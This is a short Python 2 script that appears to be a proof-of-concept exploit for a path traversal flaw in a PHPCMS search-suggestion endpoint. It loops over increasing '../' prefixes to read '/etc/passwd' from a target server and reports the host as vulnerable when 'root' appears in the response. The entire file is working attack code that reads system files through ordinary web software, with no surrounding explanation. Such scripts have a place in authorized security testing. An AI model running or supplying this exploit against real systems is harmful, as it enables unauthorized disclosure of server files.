import urllib2
import time

target = 'http://192.168.11.41/phpcms/phpcms/index.php?m=search&c=index&a=public_get_suggest_keyword&url=ASDF&q='
depth = 10
file = 'etc/passwd'

html = ''
prefix = ''
url = ''

for i in range(1,depth+1):
		prefix += '../'
		url = target + prefix + file
		print "Testing: ",url
		try:
				response = urllib2.urlopen(url)
				html = response.read()
		except:
				pass
		if("root" in html):
				print url, " is Vulnerable"
				break
		else:
				time.sleep(2)
				continue
